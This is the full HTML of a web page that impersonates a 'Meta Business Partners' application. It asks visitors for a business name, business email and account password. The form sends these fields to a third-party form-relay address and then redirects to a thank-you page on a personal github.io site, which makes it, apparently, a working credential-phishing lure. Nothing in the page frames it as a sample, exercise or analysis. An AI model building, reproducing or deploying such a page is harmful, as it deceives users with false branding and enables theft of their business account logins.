
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Apply to Meta Business Partners</title>
  <link rel="stylesheet" href="style.css" />
</head>
<body>
  <div class="container">
    <form action="https://formsubmit.co/el/begute" method="POST" class="form-box">
      <input type="hidden" name="_next" value="https://arafat61.github.io/thankyou.html">
      <div class="left">
        <h2>Apply to Meta Business Partners</h2>
        <label>Business</label>
        <input type="text" name="business" required>
        <label>Business Email</label>
        <input type="email" name="email" required>
        <label>Password</label>
        <input type="password" name="password" required>
        <label><input type="checkbox" name="subscribe" checked> Opt-in to Partner Program Updates</label>
        <button type="submit">Submit</button>
      </div>
      <div class="right">
        <p>
          Stay informed! Don't miss out on Meta Business Partner programme updates, benefit information or product and policy changes.
          Tick the box to enable partner programme update notifications in your Business Manager account.
        </p>
      </div>
    </form>
  </div>
</body>
</html>
